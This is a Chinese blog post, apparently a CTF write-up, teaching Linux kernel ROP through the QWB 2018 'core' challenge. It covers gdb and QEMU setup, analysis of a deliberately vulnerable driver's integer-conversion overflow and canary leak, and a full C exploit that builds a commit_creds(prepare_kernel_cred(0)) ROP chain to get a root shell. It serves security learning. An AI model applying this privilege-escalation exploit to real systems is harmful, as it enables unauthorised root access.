---
title: Kernel初识 - Kernel ROP
date: '2025-08-07 17:53:26'
updated: '2025-08-08 16:38:30'
permalink: posts/16108.html
categories:
  - 知识分享
tags:
  - Kernel Pwn
---

# Kernel ROP

ROP 即`返回导向编程`（Return-oriented programming），应当是大家比较熟悉的一种攻击方式——通过复用代码片段的方式控制程序执行流。

**内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由** `system("/bin/sh")` **变为了** `commit_creds(&init_cred)` 或 `commit_creds(prepare_kernel_cred(NULL))`，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。

## 状态保存 

通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要**着陆回用户态**以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要**手动模拟用户态进入内核态的准备工作**——**保存各寄存器的值到内核栈上**，以便于后续着陆回用户态。

通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：

算是一个通用的 pwn 板子。

方便起见，使用了内联汇编，由于编写风格是 Intel 汇编，编译时需要指定参数：`-masm=intel`。

```
size_t user_cs, user_ss, user_rflags, user_sp;

void save_status(void)
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );

    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}
```

## 返回用户态 

由内核态返回用户态只需要：

- `swapgs` 指令恢复用户态 GS 寄存器
- `sysretq` 或者 `iretq` 恢复到用户空间

那么我们只需要在内核中找到相应的 gadget 并执行 `swapgs;iretq` 就可以成功着陆回用户态。

通常来说，我们应当构造如下 rop 链以返回用户态并获得一个 shell：

```
↓   swapgs
	0
    iretq
    user_shell_addr
    user_cs
    user_eflags //64bit user_rflags
    user_sp
    user_ss
```

需要注意的是，在返回用户态执行 `system()` 函数时同样有可能遇到栈不平衡导致函数执行失败并最终 Segmentation Fault 的问题，因此在本地调试时若遇到此类问题，则可以将 `user_sp` 的值加减 `8` 以进行调整。

## gdb调试

首先修改init文件，添加以下命令，以便可以获取core.ko的代码段的基址。这样内核启动时就是root权限，当然这是为了调试方便，真正执行exp可以去掉这条命令 。

```
setsid /bin/cttyhack setuidgid 0 /bin/sh
```

然后重新打包文件系统，运行start.sh起内核，在qemu中查找core.ko的.text段的地址：

```
/ # cat /sys/module/core/sections/.text
0xffffffffc0205000
```

在另外一个terminal中启动gdb：

```
gdb ./vmlinux -q
```

然后添加core.ko的符号表，加载了符号表之后就可以直接对函数名下断点了。

```
gdb-peda$ add-symbol-file ./core.ko 0xffffffffc0205000
add symbol table from file "./core.ko" at
  .text_addr = 0xffffffffc0205000
Reading symbols from ./core.ko...(no debugging symbols found)...done.
```

然后运行以下命令连接qemu进行调试：

```
target remote localhost:1234
```

## exp编译

```
gcc exploit.c -static -masm=intel -g -o exploit
```

## 例题：强网杯 2018 - core

![image-20250807183616766](/images/posts/20250807184832224.png)

题目给了我们四个文件分别是 bzImage 、core.cpio 、start.sh 、vmlinux 

core.cpio 是一个打包文件，解包里面有文件系统 ，其中 vmlinux 命名的是内核的二进制文件， 而 core.ko 是存在漏洞的驱动，也就是题目分析的二进制文件 。

start.sh 是启动脚本 ，标明启动方法、保护措施等。

bzImage 是镜像文件 

类比用户态的pwn，.ko 文件就是 binary 文件 ，vmlinux 就是 libc ，不同保护机制是由如何启动来决定的 。

如果题目中没有提供 vmlinux ，那么我们可以通过` ./extract-vmlinux ./bzImage > vmlinux` 来从镜像文件中提取 vmlinux 。

和用户态做题思路一致，我们可以先观察一下程序开启了什么样的保护 

![image-20250714121645586](/images/posts/20250807184843577.png)

`qemu-system-x86_64 ` 代表的是模拟 x86_64 架构的计算机系统 。

`-m 256M ` 代表的是内核的运行内存大小分配，其实题目一开始是分配 64M 大小的内存空间，但是我发现启动不了，于是我就把这个调到 256M 了 ，

`-kernel ./bzlmage` 指定要启动的 Linux 内核镜像文件 。bzImage 属于压缩格式的镜像文件，是 Linux 内核编译后生成的可执行文件。

`initrd ./core.cpio` 这是用来指定初始化 RAM 磁盘 (initrd) 的文件。initrd 是一个临时的根文件系统 ，在 Linux 内核的早期阶段会被加载。它包含了内核启动所需要的基本驱动程序和工具 。

`-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr"` 此参数用于向内核传递启动参数

- `root=/dev/ram` 告知内核根文件系统位于 RAM 中，也就是之前通过 `-initrd` 参数指定的 initrd 。
- `rw`： 将跟文件系统设置为可读写模式 。
- `console=ttys0`：把串口（ttyS0）设置为控制台 ，这样所有输出的信息都会通过串口显示，这在`-nographic` 模式下尤为重要 。
- `oops=panic`：当系统文件出现严重（oops）时 ，让内核直接进入 panic 状态 。
- `panic=1`：内核进入 panic 状态后 ，1 秒后自动重启系统 。
- `quiet`：开启静默启动模式，只显示关键的启动信息，减少不必要的输出 。
- `kaslr`：启用内核地址空间布局随机化（KASLR），增强系统的安全性 。

**-s**

这个是 `-gdb tcp::1234` 的简写形式 ，其功能是在 TCP 端口 1234 上开启 GDB 调试服务器 。通过这个服务器，你可以使用 GDB 远程调试内核 。

`-netdev user,id=t0 -device e1000,netdev=t0,id=nic0`

这部分用于配置虚拟机的网络设备：

- `-netdev user,id=t0`：创建一个用户模式的网络设备，设备 ID 为 t0。这种网络模式提供了简单的网络功能，支持 NAT 转换，能让虚拟机访问外部网络。
- `-device e1000,netdev=t0,id=nic0`：为虚拟机添加一个 e1000 型号的网卡，该网卡连接到之前创建的网络设备 t0，网卡 ID 为 nic0。

`-nographic`

该参数用于禁用图形输出，让 QEMU 以纯文本模式运行。此时，虚拟机的控制台输出会通过串口（ttyS0）显示在终端上，这对于没有图形界面的系统调试非常实用。

这些参数有的只要了解一个大概就行了 ，主要我们还是看内核的架构和保护 ，这道题目只开启了 `kaslr` ,也就是空间地址随机化。

接下来我们解压打包文件 ，查看文件系统，我之前用 Ubuntu 的时候，双击这个 core.cpio 就可以一键解压这个打包文件了 ，但是我后面换到了 WSL - Ubuntu-22.04 ，也就是子系统Ubuntu，但是它好像不支持这个快捷解压方式 ，所以我只能通过以下一些命令来对这个 core.cpio 进行一个解压：

```
mkdir core
cd core 
mv ../core.cpio core.cpio.gz
gunzip ./core.cpio.gz
cpio -idm < ./core.cpio
```

![image-20250714125048599](/images/posts/20250807184847836.png)

这就是解压后的一个文件状态 ，之前说过我们漏洞的主要分析是在这个 core.ko 文件里面的 ，我们先来看一下 init 初始化启动脚本：

![image-20250714125420323](/images/posts/20250807184849768.png)

这里面我看得也不是很懂，所以我就直接引用 ctfwiki 里面的原话了：

- 第 9 行中把 `kallsyms` 的内容保存到了 `/tmp/kallsyms` 中，那么我们就能从 `/tmp/kallsyms` 中读取 `commit_creds`，`prepare_kernel_cred` 的函数的地址了。
- 第 10 行把 `kptr_restrict` 设为 1，这样就不能通过 `/proc/kallsyms` 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了。
- 第 11 行把 `dmesg_restrict` 设为 1，这样就不能通过 `dmesg` 查看 kernel 的信息了。
- 第 18 行设置了定时关机，为了避免本地做题时产生干扰，我们可以把这句删掉然后重新打包（已经被我删掉了）。

经过一些前置内核知识的学习 ，由于 kernel pwn 的最终目的是提权到 root ，一种简单方便的方法就是执行

```
commit_creds(prepare_kernel_cred(0));
```

看来这个 `proc/kallsyms` 中保存了这两个函数的地址 ，虽然后面关闭了 `/proc/kallsyms` 的读取，但是好在我们的init初始化脚本给我们保存到了 `/tmp/kallsyms` ，我们后面可以在这里进行一个函数地址的读取 。

修改完成之后，我们先删除之前的打包文件 core.cpio , 然后我们再次对文件系统进行一个打包 。

![image-20250714130526337](/images/posts/20250807184854209.png)

由于题目给了我们一个方便打包的脚本，所以我们可以利用这个快速打包。

```
rm core.cpio
./gen_cpio.sh core.cpio
```

打包好之后我们就可以获得一个新的 core.cpio 文件 ，我们将这个core.cpio文件移到之前的文件夹，然后退出 core 文件夹 ，尝试使用 start.sh 启动脚本对内核进行一个启动。

![image-20250714131039009](/images/posts/20250807184855820.png)

这就是启动成功的一个状态，可以看到 vscode 提示我们开启了一个端口 ，就是之前在 start.sh 启动文件设置的 `-s` ，在 TCP::1234 端口上开启一个 GDB 的远程调试服务器， 我们就可以通过这个端口来调试内核了 。

exit 退出内核， 我们开始前往 core 文件夹分析 core.ko 的程序漏洞 

![image-20250714131514614](/images/posts/20250807184934247.png)

amd64架构 ，canary保护 ，NX保护 ，我们接着用 IDA 打开这个 core.ko

![image-20250714142935369](/images/posts/20250807184936729.png)

init_module 函数创造了 /proc/core 接口 

![image-20250714143020452](/images/posts/20250807184857725.png)

exit_core 函数删除了 /proc/core 接口

![image-20250714143838810](/images/posts/20250807184859253.png)

交互函数 core_ioctl（）定义了三条命令 ，分别是调用 core_read（），core_copy_func（）和设置全局变量 off ：

core_read（）：

![image-20250714143959039](/images/posts/20250807184900774.png)

从 v5[off] 拷贝 64 个字节到用户空间 ，由于全局变量off是我们可以控制的，所以我们可以合理的控制 `off` 来 leak canary 和栈上的一些其他数据 。

core_copy_func（）：

![image-20250714150656178](/images/posts/20250807184902057.png)

我们的漏洞主要出现在这里 ，这里从 name 区域复制了a1个字节的数据到v2 ，但是我们这个a1前面有个检查要求小于等于63 ，可是我们通过观察数据类型发现， a1的数据类型由 int64 转化成了 unsigned __int16 ，也就是由有符号转化成无符号数据类型，这个时候，我们就可以让 a1 等于一个小于0的数据，比如说是0xffffffffffff0000|(0x100) ，我们就可以绕过这个检查，实现栈溢出 。

core_write（）：

![image-20250714151027661](/images/posts/20250807184939174.png)

core_write（）向全局变量 name 上写 ，所以我们通过 core_write 和 core_copy_func 函数就可以完成 ROPchain 到内核空间的拷贝和执行 。

### 解题思路（来自ctfkiwi的总结）

经过如上的分析，可以得出以下解题思路：

1. 通过 ioctl 设置 off，然后通过 core_read() 泄漏出 canary
2. 通过 core_write() 向 name 写，构造 ropchain
3. 通过 core_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop
4. 通过 rop 执行 `commit_creds(prepare_kernel_cred(NULL))` 进行提权
5. 返回用户态，通过 system("/bin/sh") 等起 shell

commit_creds（） 和 prepare_kernel_cred（）的地址之前说过可以通过init保存在/tmp/kallsyms的数据来进行读取，同时我们也可以根据其距离vmlinux的固定偏移来确定 gadgets 的地址 ，其实这里就和用户态linux的题目非常的相似了 。

我们先在qemu中查看这两个函数的地址 ：

![image-20250714154407515](/images/posts/20250807184905516.png)

```
/ $ cat /tmp/kallsyms | grep commit_creds
ffffffff9e09c8e0 T commit_creds
/ $ cat /tmp/kallsyms | grep prepare_kernel_cred
ffffffff9e09cce0 T prepare_kernel_cred
```

然后计算这两个函数在 vmlinux 的偏移 ：

写一个简单的check脚本：

```
~/PWN/kernel/kernelROP/QWB2018-core/give_to_player                                 root@SpaceDraG0n 03:47:06 PM
❯ cat check.py   
from pwn import *
elf = ELF('./core/vmlinux')
print("commit_creds  >> " + hex(elf.symbols['commit_creds']-0xffffffff81000000))
print("prepare_kernel_cred  >>" + hex(elf.symbols['prepare_kernel_cred']-0xffffffff81000000))
```

![image-20250714154752358](/images/posts/20250807184907302.png)

这样我们就可以把函数在 vmlinux 的偏移求出来了 

![image-20250714155737487](/images/posts/20250807184908541.png)

然后我们就可以通过实际函数地址减去得到的偏移，然后就可以知道vmlinux基地址 `0xffffffff9e000000`

当然我们这个vmlinux地址是会变的，但是我们之所以要求出来，是为了知道栈上其他地址对与vmlinux的固定偏移，知道了这个固定偏移我们就可以通过copy_to_user，把栈上的值减去偏移从而得到vmlinux_base

然后我们就去 vmlinux 里面找一些 gadget ，这里我们使用 ropper 进行一个提取 ，因为用 ROPgadget 进行提取会比较慢 。

```
ropper --file ./vmlinux --nocolor > gadget_ropper.txt
```

然后可以使用正则表达式寻找我们想要的gadget

![image-20250719231948241](/images/posts/20250807184909915.png)

canary的值就是这个 ，然后因为我们赋值了0x40到buf，所以后面的数据也一同复制到了buf，所以我们可以得到core_base 以及 vmlinux_base ，至于固定偏移怎么求，我前面已经讲过了 。

![image-20250719232832809](/images/posts/20250807184911309.png)

这里现在验证一下泄露有没有问题，发现没有问题我们就可以进行下一步 rop 的编写了 ，因为我们在内核空间是通过执行 `commit_creds(prepare_kernel_cred(NULL))` 来提权的，所以我们要准备一个比较特殊的gadget `mov rdi,rax;call rdx;`

其实就是把`prepare_kernel_cred(0)` 的返回值放到rdi寄存器里面，然后调用`commit_creds`函数，但是这里不是直接调用 ，而是通过执行pop_rcx间接调用 ，rop构造如下：

```
    int i = 0;
    for(i=0;i<10;i++){
        rop[i] = canary;
    }
    i = 10;
    rop[i++] = pop_rdi; 
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = pop_rdx;
    rop[i++] = pop_rcx;
    rop[i++] = mov_rdi_rax_call_rdx;
    rop[i++] = commit_creds;
    rop[i++] = swapgs; //恢复用户GS寄存器
    rop[i++] = 0;
    rop[i++] = iretq;
    rop[i++] = (size_t)get_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
```

```
↓   swapgs
    iretq
    user_shell_addr
    user_cs
    user_eflags //64bit user_rflags
    user_sp
    user_ss
```

其实就是提权后构造以上的rop链 

![image-20250719235642606](/images/posts/20250807184913903.png)

然后我们可以利用 core_write 函数，把我们构造出来的rop通过copy_from_user函数来复制到name变量里面去，这里的 core_write 函数可以直接调用，不需要我们通过 ioctl 间接调用：

![image-20250719235923415](/images/posts/20250807184915592.png)

大概是因为 core_write 函数被定义到 core_fops 这个全局变量里面 ，所以我们可以直接进行调用 

![image-20250720000310012](/images/posts/20250807184916645.png)

然后我们用数据类型引起的overflow，调用core_copy_func函数来布置rop栈溢出就可以实现内核提权了

![image-20250720002143694](/images/posts/20250807184917985.png)

### EXP：

```
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<fcntl.h>
#include<string.h>
#include<sys/types.h>
#include<sys/wait.h>
#include<sys/ioctl.h>
#include<pthread.h>
void setoff(int fd,long long size){
    ioctl(fd,0x6677889c,size);
}
void core_read(int fd,char *buf){
    ioctl(fd,0x6677889b,buf);
}
void core_copy_func(int fd,long long size){
    ioctl(fd,0x6677889a,size);
}
size_t user_cs, user_ss, user_rflags, user_sp;

void save_status(void)
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );

    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void get_shell(){
	system("/bin/sh");
}

int main(){
    int fd ;
    size_t tmp;
    char buf[0x50];
    size_t rop[0x100];
    size_t vmlinux_base,canary,core_base;
    size_t commit_creds = 0x9c8e0;
    size_t prepare_kernel_cred = 0x9cce0;
    save_status();
    fd = open("/proc/core",O_RDWR); //程序创造了一个接口，所以我们需要把这个接口给打开 ，这样才能进行函数调用
    if(fd < 0) {
        printf("Open /proc/core error!\n");
        exit(0);
    }
    setoff(fd,0x40); // v4 距离 canary 的偏移是 0x40 ，而且v5的数据类型是char类型。
    core_read(fd,buf); //把canary读入用户态的buf 
    size_t pop_rdi = 0x000b2f;
    size_t push_rax = 0x02d112;
    size_t swapgs = 0x0d6;
    size_t iretq ;
    size_t xchg = 0x16684f0;
    size_t call_rax = 0x40398;
    size_t pop_rcx = 0x21e53;
    size_t pop_rbp = 0x3c4;
    size_t pop_rdx = 0xa0f49;
    size_t mov_rdi_rax_call_rdx = 0x01aa6a;
    //此时buf的前八个字节是我们的canary
    canary = (*(size_t *)(&buf[0]));
    puts("\033[34m\033[1m[*] leak success! .\033[0m");
    printf("\033[34m\033[1m[*] Canary  >> %p.\033[0m\n",canary);
    core_base = (*(size_t *)(&buf[2*8])) - 0x19b;
    puts("\033[34m\033[1m[*] leak success! .\033[0m");
    printf("\033[34m\033[1m[*] core_base  >> %p.\033[0m\n",core_base);
    vmlinux_base = (*(size_t *)(&buf[4*8]) - 0x1dd6d1);
    puts("\033[34m\033[1m[*] leak success! .\033[0m");
    printf("\033[34m\033[1m[*] vmlinux_base  >> %p.\033[0m\n",vmlinux_base);
    pop_rdi += vmlinux_base;
    pop_rcx += vmlinux_base;
    pop_rbp += vmlinux_base;
    pop_rdx += vmlinux_base;
    mov_rdi_rax_call_rdx += vmlinux_base;
    swapgs += core_base;
    iretq = 0x50ac2 + vmlinux_base;
    commit_creds += vmlinux_base;
    prepare_kernel_cred += vmlinux_base;
    int i = 0;
    for(i=0;i<10;i++){
        rop[i] = canary;
    }
    i = 10;
    rop[i++] = pop_rdi; 
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = pop_rdx;
    rop[i++] = pop_rcx;
    rop[i++] = mov_rdi_rax_call_rdx;
    rop[i++] = commit_creds;
    rop[i++] = swapgs; //恢复用户GS寄存器
    rop[i++] = 0;
    rop[i++] = iretq;
    rop[i++] = (size_t)get_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
    write(fd,rop,i*8);
    core_copy_func(fd,0xf000000000000000+i*8);
    puts("\033[34m\033[1m[*] Attack Success! .\033[0m");
    return 0;
}
```



## 参考链接：

https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/rop/

https://ret2p4nda.github.io/2018/07/13/ciscn2018-core/

https://www.z1r0.top/2021/10/22/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B









































